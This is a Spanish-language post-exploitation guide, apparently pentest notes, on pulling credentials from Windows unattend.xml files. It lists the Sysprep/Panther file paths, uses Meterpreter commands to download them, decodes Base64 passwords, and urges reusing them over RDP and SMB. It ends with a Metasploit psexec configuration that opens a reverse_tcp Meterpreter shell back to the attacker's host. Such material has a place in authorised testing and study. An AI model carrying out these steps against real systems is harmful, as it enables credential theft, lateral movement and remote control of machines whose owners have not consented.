# Extracción de contraseñas desde `unattend.xml` en Windows con Meterpreter

---

## 📋 Resumen

Cuando un administrador despliega Windows con herramientas como Sysprep, puede dejar un archivo `unattend.xml` en el disco.  
Este archivo contiene configuraciones del despliegue, incluyendo a menudo contraseñas locales en texto claro o codificadas en Base64.  
Durante una post-explotación, es muy útil buscar y extraer estas credenciales.

---

# 🔍 ¿Dónde buscar el `unattend.xml`?

Ubicaciones típicas:
```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Sysprep.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

---

#  Pasos para extraerlo desde Meterpreter

### Conseguir una sesión `meterpreter` en la víctima
Por ejemplo, usando un exploit o payload.

### Navegar a las carpetas objetivo
Desde `meterpreter`:
```
cd C:\\Windows\\Panther
```

Listar los archivos:
```
ls
```

Si no está ahí, prueba las otras rutas (`C:\Windows\System32\Sysprep` etc.).

---

### 3️ Descargar el archivo a tu máquina
Una vez lo encuentres:
```
download unattend.xml /ruta/local/donde/guardarlo/
```

Por ejemplo:
```
download unattend.xml /root/Desktop/unattend.xml
```

---

#  Identificar la contraseña en el archivo

Abre el archivo descargado. Busca en las secciones `<UserData>` o `<AutoLogon>` algo así:
```xml
<AutoLogon>
    <Password>
        <Value>P@ssw0rd</Value>
        <PlainText>true</PlainText>
    </Password>
</AutoLogon>
```

O en Base64:
```xml
<Password>
    <Value>UGFzc3dvcmQxMjM=</Value>
    <PlainText>false</PlainText>
</Password>
```

---

# Decodificar la contraseña si está en Base64

Si la contraseña aparece codificada (`PlainText=false`), decódificala con `base64`.

En Linux:
```
echo 'UGFzc3dvcmQxMjM=' | base64 -d
```

Resultado:
```
Password123
```

En Windows (PowerShell):
```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFzc3dvcmQxMjM="))
```

---

#  Consejos
- Aunque `PlainText=false`, la codificación Base64 **no es cifrado**, solo ofuscación: es trivial de recuperar.
- Busca también `sysprep.xml` y cualquier `.xml` dentro de `Panther` o `Sysprep`, ya que pueden contener otras credenciales.
- Una vez obtenida la contraseña, prueba a usarla en otras cuentas locales, RDP, SMB, etc.
---
## Con esto entramos con Psexec:

````
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <IP_OBJETIVO>
set SMBUser <usuario>
set SMBPass <contraseña>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
exploit
````
